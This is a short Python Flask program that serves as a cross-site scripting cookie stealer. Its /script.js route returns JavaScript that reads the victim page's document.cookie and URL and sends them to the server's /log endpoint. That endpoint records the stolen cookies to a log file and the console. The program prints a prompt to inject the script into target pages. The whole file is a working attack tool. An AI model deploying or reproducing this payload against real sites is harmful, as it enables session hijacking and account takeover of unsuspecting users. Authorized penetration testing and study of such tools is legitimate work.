import argparse
import sys

import colorama
import logging

import flask
from flask import Flask, request

colorama.init()
GREEN = colorama.Fore.GREEN
RESET = colorama.Style.RESET_ALL
YELLOW = colorama.Fore.YELLOW

# setting up logging
logger = logging.getLogger(__name__)
logger.setLevel(logging.INFO)

logFormatter = logging.Formatter("%(asctime)s [%(levelname)-4s]  %(message)s")
fileHandler = logging.FileHandler("cookies.log")
fileHandler.setFormatter(logFormatter)
logger.addHandler(fileHandler)

consoleHandler = logging.StreamHandler(stream=sys.stdout)
consoleHandler.setFormatter(logFormatter)
logger.addHandler(consoleHandler)

app = Flask(__name__)


@app.route("/script.js")
def get_script():
    script = f"""try {{
let url = new URL('log', '{app.config['hosted_on_url']}');
url.searchParams.set('data', document.cookie);
url.searchParams.set('url', document.URL);
let xhr = new XMLHttpRequest();
xhr.open('GET', url);
xhr.send();
}} catch (e) {{ }}"""

    resp = flask.Response(script)
    resp.headers['Access-Control-Allow-Origin'] = '*'

    return resp


@app.route("/log")
def log_cookie():
    cookie = str(request.args.get('data'))
    url = str(request.args.get('url'))
    logger.info(f"{GREEN}Got cookie{RESET} on \"{url}\": {cookie}")

    resp = flask.Response("")
    resp.headers['Access-Control-Allow-Origin'] = '*'

    return resp


def create_app(url: str) -> Flask:
    if not url.endswith('/'):
        url += '/'
    if not url.startswith('http'):
        url = 'http://' + url

    app.config['hosted_on_url'] = url

    print(f'{YELLOW}[*] Inject this script to log cookie:{RESET} {url + "script.js"}')

    return app


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--url', type=str, required=True,
                        help='Url on which this site is hosted. Must be https for script to work on https sites')
    args = parser.parse_args()

    create_app(args.url).run()
